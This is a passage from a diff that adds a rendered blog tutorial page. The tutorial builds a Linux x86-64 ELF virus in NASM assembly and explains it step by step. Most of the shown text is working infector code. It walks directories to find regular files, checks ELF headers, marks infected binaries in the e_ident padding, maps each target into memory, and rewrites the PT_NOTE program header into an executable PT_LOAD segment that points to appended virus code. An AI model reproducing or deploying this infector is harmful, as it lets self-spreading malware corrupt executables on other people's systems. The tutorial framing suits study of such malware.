+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_reclen]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     r8w, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      loop_buf_dirent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     loop_dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end_readdir:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the &lt;code&gt;readdir&lt;/code&gt; function, we will loop through all the &lt;code&gt;linux_dirent64&lt;/code&gt; structures present in each of the target directories. If the current structure describes a regular file, we will call the &lt;code&gt;infect&lt;/code&gt; function with its name as argument to try to infect it.&lt;/p&gt;
+&lt;h4 id=&#34;preliminary-checks&#34;&gt;Preliminary checks&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;infect&lt;/code&gt; function will be the main function of our program. To make the code more clean, I&amp;rsquo;ve defined a structure called &lt;code&gt;Infection_struct&lt;/code&gt; in &lt;code&gt;defines.s&lt;/code&gt; that will allow me, by considering the stack frame as this structure to use its fields as local variable names.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;infect:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, INFECTOR_STRUCT_SIZE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     esi, O_RDWR
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_OPEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd], eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, ELFHDR_SIZE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_READ
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rbx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; ELF_MAGIC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_CLASS], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFCLASS64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_DATA], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFDATA2LSB       &lt;span style=&#34;color:#75715e&#34;&gt;; Only ELF 64 bits are being taken into account&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC   &lt;span style=&#34;color:#75715e&#34;&gt;; We check them to avoid double infection&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rdx, rdx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     ax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_type]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_EXEC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      right_type_check
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_DYN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first part of this function is just about parsing the ELF header to check for several things:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The file is a valid ELF file&lt;/li&gt;
+&lt;li&gt;It is either an executable file or a shared object file&lt;/li&gt;
+&lt;li&gt;It has not been infected yet&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Since it is useless and memory-consuming to reinfect a file, we will prevent that to append. In the &lt;code&gt;e_ident&lt;/code&gt; field of the ELF header, there are some padding bytes that are unused and zero-filled. We will put an infection marker here to keep track of the already infected binaries.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;right_type_check:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rsi, rsi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, SEEK_END
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_LSEEK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize], rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_SHARED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8d, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MMAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                     &lt;span style=&#34;color:#75715e&#34;&gt;; We map the file into memory to operate on it&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     close_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC &lt;span style=&#34;color:#75715e&#34;&gt;; Mark binary for infection&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phoff]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   rcx, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_phdrs:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_NOTE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     cmp_load_phdr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp_load_phdr:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_phdr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load], r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_phdr:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phentsize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    loop_phdrs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_if_note_exists:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rax, rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jz&lt;/span&gt;      munmap_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This next code chunk is gonna map the file into memory and get some information that are gonna be useful for the infection routine such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;the file size&lt;/li&gt;
+&lt;li&gt;the &lt;code&gt;PT_NOTE&lt;/code&gt; phdr address&lt;/li&gt;
+&lt;li&gt;the last &lt;code&gt;PT_LOAD&lt;/code&gt; phdr address&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;infection&#34;&gt;Infection&lt;/h4&gt;
+&lt;p&gt;Once we have every needed information, we can get to the serious part.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_note_phdr:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD       &lt;span style=&#34;color:#75715e&#34;&gt;; We make it loadable&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_flags], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PF_R &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PF_X  &lt;span style=&#34;color:#75715e&#34;&gt;; And executable&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]     &lt;span style=&#34;color:#75715e&#34;&gt;; It starts at the EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset], rdx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_filesz], virus_len   &lt;span style=&#34;color:#75715e&#34;&gt;; We update the sizes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_memsz], virus_len
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_align], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;       &lt;span style=&#34;color:#75715e&#34;&gt;; And the alignement&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rdx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]                &lt;span style=&#34;color:#75715e&#34;&gt;; we get the last page used&lt;/span&gt;
